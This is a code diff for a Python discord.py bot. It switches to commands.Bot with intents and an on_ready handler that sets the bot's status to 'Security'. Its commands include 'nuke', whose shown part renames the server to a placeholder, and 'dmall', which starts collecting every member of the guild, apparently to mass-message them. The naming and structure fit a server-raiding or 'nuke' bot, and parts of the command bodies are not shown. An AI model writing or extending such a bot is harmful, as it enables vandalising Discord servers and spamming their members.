@@ -1,23 +1,32 @@
 import discord
-from discord.ext.commands import Bot
-from discord import Client
-from discord.ext import commands
+from discord.ext import commands, tasks
+import os
 import asyncio
 
-bot = discord.Client()
+prefix='!'
+n=0
 
-bot = commands.Bot(command_prefix='!')
+intents=discord.Intents.default()
+intents = discord.Intents(messages=True, guilds=True)
 
 
-@bot.event
+
+
+client = commands.Bot(command_prefix=prefix, intents=intents)
+@client.event
+async def on_ready():
+    print('Bot is online')
+    await client.change_presence(activity=discord.Game('Security'))
+
+@client.command()
 async def ping(ctx):
     await ctx.send(f'Pong! {round(client.latency * 1000)}ms')
 
-@bot.event
+@client.command()
 async def invite(ctx):
   await ctx.reply('')
 
-@bot.event
+@client.command()
 async def nuke(ctx):
     await ctx.guild.edit(name='SERVER NAME') #Decide what to change the server name to
 
@@ -37,7 +46,7 @@ async def nuke(ctx):
      
  
  
-@bot.event
+@client.command()
 async def dmall(ctx, *,args=None):
      if args != None:
        members = ctx.guild.members
